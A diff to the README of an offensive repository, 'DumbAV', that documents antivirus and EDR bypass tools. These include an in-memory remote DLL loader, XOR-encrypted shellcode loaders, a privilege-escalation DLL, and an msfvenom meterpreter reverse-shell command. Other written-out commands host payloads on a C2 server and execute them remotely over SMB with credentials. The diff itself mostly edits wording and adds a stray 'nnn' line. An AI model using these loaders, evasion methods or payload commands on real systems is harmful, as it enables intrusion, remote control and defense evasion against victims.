@@ -3,6 +3,7 @@ DumbAV is a handy collection of simple AV bypass methods. This is a mish-mash of
 
 * remote_dll_loader.exe - This program loads a DLL from a provided URL or local file into memory and executes it. No touching disk, which is nice.
 * xor_loader_dll.c - This DLL loads XOR encrypted shellcode from hamdinger_data.h and executes it. Pairs well with remote_dll_loader.exe.
+* hamdinger_pro.c - This loads encrypted XOR shellcode, but adds a number of behavioral evasion techniques pivoting away from Win32 into ntdll.
 * xor_encrypt.py - This Python script converts raw shellcode into an XOR encrypted char array stored in the header, hamdinger_data.h.
 * privesc_dll.c - This DLL uses the SeDebugPrivilege and token cloning to (hopefully) launch an elevated process. Pairs well with remote_dll_loader.exe
 
@@ -66,7 +67,7 @@ C:\Windows\system32>
 #### Remote Hosted
 
 The scenario below demonstrates how privesc.dll can be hosted on a C2 server. This way we never touch disk with the malicious bits. First we fire up a simple python server to host the DLL.
-
+nnn
 ```
 $ python -m http.server 8337
 Serving HTTP on 0.0.0.0 port 8337 (http://0.0.0.0:8337/) ...
@@ -109,7 +110,7 @@ cmd.exe                       4904 Console                    1      3,212 K
 ### Signature based evasion
 #### XOR Loader VirtualAlloc
 
-The XOR loader method is nice, mainly because it's simple. The general scenario is that we want to execute a Metasploit payload. AV hates Metasploit payloads, so we need to introduce an intermediary. We do this by way of XOR encoding raw shellcode from msfvenom. It’s a great reference for how relatively simple C-based obfuscation (like the XOR-based payload delivery you demonstrated here) can still effectively bypass signature-based detection. Since that project focuses on the "stupid simple" approach of XORing a payload and executing it to show how easily AV can be defeated. 
+The XOR loader method is nice, mainly because it's simple. The general scenario is that we want to execute a Metasploit payload. AV hates Metasploit payloads, so we need to introduce an intermediary. We do this by way of XOR encoding raw shellcode from msfvenom. It’s a great reference for how relatively simple C-based obfuscation (like the XOR-based payload delivery) can still effectively bypass signature-based detection. It's the "stupid simple" approach of XORing a payload and executing it to show how easily some AV can be defeated. 
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Listening Port> -f raw -o yanky.doodle
@@ -175,7 +176,7 @@ $ smbmap -H 192.168.86.30 -u administrator -p asdf1234 -x 'c:\tools\remote_dll_l
 ```
 
 ### Behavioral Evasion
-The original xor_loader.c served as a "Dumb" baseline to prove that simple static obfuscation (XOR) could bypass basic signature-based detection. The new hamdinger_pro.c is a "Smart" successor designed to bypass modern Behavioral Engines, EDR Hooks, and Memory Scanners.
+The original xor_loader.c served as a baseline to prove that simple static obfuscation (XOR) could bypass basic signature-based detection. The new hamdinger_pro.c is a natural evolution designed to bypass modern Behavioral Engines, EDR Hooks, and Memory Scanners.
 
 1. Memory Residency & Allocation
 Original: Used VirtualAlloc with PAGE_EXECUTE_READWRITE (RWX). This is a "noisy" allocation that triggers immediate alerts in modern behavioral engines (Heuristics).
